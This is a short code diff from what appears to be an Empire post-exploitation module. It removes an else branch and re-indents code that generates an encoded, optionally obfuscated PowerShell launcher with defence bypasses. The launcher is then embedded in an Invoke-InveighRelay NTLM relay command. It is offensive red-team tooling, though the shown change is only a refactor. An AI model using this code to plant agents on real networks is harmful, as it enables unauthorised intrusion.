@@ -36,23 +36,22 @@ class Module:
                 # not a valid listener, return nothing for the script
                 return handle_error_message("[!] Invalid listener: " + listener_name)
 
-            else:
-                # generate the PowerShell one-liner with all of the proper options set
-                command = main_menu.stagers.generate_launcher(
-                    listenerName=listener_name,
-                    language="powershell",
-                    encode=True,
-                    obfuscate=launcher_obfuscate,
-                    obfuscation_command=launcher_obfuscate_command,
-                    userAgent=user_agent,
-                    proxy=proxy,
-                    proxyCreds=proxyCreds,
-                    bypasses=params["Bypasses"],
-                )
+            # generate the PowerShell one-liner with all of the proper options set
+            command = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=launcher_obfuscate,
+                obfuscation_command=launcher_obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxyCreds,
+                bypasses=params["Bypasses"],
+            )
 
-                # check if launcher errored out. If so return nothing
-                if command == "":
-                    return handle_error_message("[!] Error in launcher generation.")
+            # check if launcher errored out. If so return nothing
+            if command == "":
+                return handle_error_message("[!] Error in launcher generation.")
 
         # set defaults for Empire
         script_end = "\n" + f'Invoke-InveighRelay -Tool "2" -Command \\"{command}\\"'
